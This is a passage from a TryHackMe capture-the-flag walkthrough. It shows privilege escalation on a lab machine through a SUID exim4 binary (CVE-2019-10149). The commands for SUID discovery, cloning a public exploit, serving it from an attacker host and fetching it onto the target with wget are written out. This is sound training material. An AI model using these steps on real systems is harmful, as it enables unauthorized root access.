<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-caB-K0rTHKk/YNNhZTvaBpI/AAAAAAAAwrE/8GHQHRgcIc0VWrFJblXupVDiPZ-PMR4igCLcBGAsYHQ/s16000/44.png"/></span></p>
<p><span style="color: #000000;">We login as the gunter user and moved into its home directory. Here we found the flag4 on the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su gunter
cd ~
ls
cat flag4</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iiKMBODZMv0/YNNhe5UgH8I/AAAAAAAAwrQ/taO5TJ-j6TAUnPwostfnUVLnrBjtKjPCwCLcBGAsYHQ/s16000/45.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">Since we are at the last flag, we need to elevate our privileges to the Princess Bubblegum user account. We check for the SUID permissions using the find command. We see that it is set on exim4.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JaaBF5EPrV0/YNNhkM-YBtI/AAAAAAAAwrU/f9mMhpq0ic01c5MMJ32Rs5ouRiT_tsp6gCLcBGAsYHQ/s16000/46.png"/></span></p>
<p><span style="color: #000000;">To exploit this permission on exim4, we need to understand the configuration of Exim on the target machine. This service runs on a specific port and we can find the port number by taking a look at the update-exim4.conf file. We can see that it is configured to run on port 60000.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/exim4/update-exim4.conf.conf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nERSL5C8do4/YNNhuLwqD1I/AAAAAAAAwrY/GRAFbTKPef8DDf0KYFFvc3I8tQIXC_rYgCLcBGAsYHQ/s16000/47.png"/></span></p>
<p><span style="color: #000000;">Then, we will use the multiple exploits available on the exploitdb for this privilege escalation. Specifically, we obtained this exploit from GitHub, as it is made in Python and can easily interact with the exim4 on the target machine. We clone the repository and find a wizard.py file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/AzizMea/CVE-2019-10149-privilege-escalation exim4
cd exim4
ls
nano wizard.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ODaZYXraOCY/YNNhzo7RsNI/AAAAAAAAwrg/M-tACMIz64g0-Yu4xC-4yvzPkRxE-1nZwCLcBGAsYHQ/s16000/48.png"/></span></p>
<p><span style="color: #000000;">Then, we edited the file to include the port number that the service was running on the target machine i.e., 60000</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jxrP7YQXzwk/YNNh7G-HKWI/AAAAAAAAwro/OgNiZZgjKPIr2rHusjwSaFG3fIpe28IvwCLcBGAsYHQ/s16000/49.png"/></span></p>
<p><span style="color: #000000;">We use the python one-liner HTTP server to send the wizard.py file to the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KX9usVdwmfY/YNNiFcim5EI/AAAAAAAAwr0/KV8sUHTQoLcfK3gnMqKxMOF6dHp6jG3WwCLcBGAsYHQ/s16000/50.png"/></span></p>
<p><span style="color: #000000;">Then, we use the wget command on the target machine as the gunter user to download the file hosted by the attacker machine as demonstrated in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.209.22:8000/wizard.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LUAKFHuTizE/YNNiK1SgtDI/AAAAAAAAwr8/szAiN6-1c_ooRADcDYd-hzqZQo9PGQLZQCLcBGAsYHQ/s16000/51.png"/></span></p>
<p><span style="color: #000000;">We move the wizard.py file to the temp directory so that we have the appropriate permissions to execute the exploit that will provide us with elevated access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv wizard.py /tmp
cd /tmp
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RHCWuGZApcg/YNNi09G9x-I/AAAAAAAAwsU/9v3yS7HT69crSJGZfU-YruMye9srNHpawCLcBGAsYHQ/s16000/52.png"/></span></p>
<h4><span style="color: #000000;">Gaining Root Access</span></h4>
<p><span style="color: #000000;">Running the exploit, we see that our access was elevated to root. We confirmed the elevation using the id command as shown in the screenshot below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 wizard.py
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GFZ0N0yNQNk/YNNirdfYPHI/AAAAAAAAwsM/wn-KVztMBP0AAS0YAiLmxJJg9bnKVcDewCLcBGAsYHQ/s16000/53.png"/></span></p>
<p><span style="color: #000000;">We traversed into the home directory to find the bubblegum user’s home directory. Moving inside we found a text file by the name of bmo.txt</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls /home
cd /home/bubblegum
ls
cd Secrets
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tsFT-U8rIyE/YNNiUvw-weI/AAAAAAAAwsA/Z2A14g4C0rMfNfQcfq1YXThxAo6-B8tkQCLcBGAsYHQ/s16000/54.png"/></span></p>
<p><span style="color: #000000;">Upon opening the file, we found a fan art of Finn for us to enjoy and the reset code in the mode of the final flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat bmo.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-i79C-Haod8E/YNNiisISF-I/AAAAAAAAwsE/PHdQ_3cUH8IVO--HQ428MMgfYb9nWiKwQCLcBGAsYHQ/s16000/55.png"/></span></p>
<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on</span> <strong>Twitter</strong> <span style="color: #000000;">and </span><strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/dailybugle-tryhackme-walkthrough/" title="DailyBugle TryHackMe Walkthrough">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">DailyBugle TryHackMe Walkthrough</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/wireless-penetration-testing-password-cracking/" rel="prev">Wireless Penetration Testing: Password Cracking</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/" rel="next">Wireless Penetration Testing: PMKID Attack</a></div></div>
	</nav>        </div>
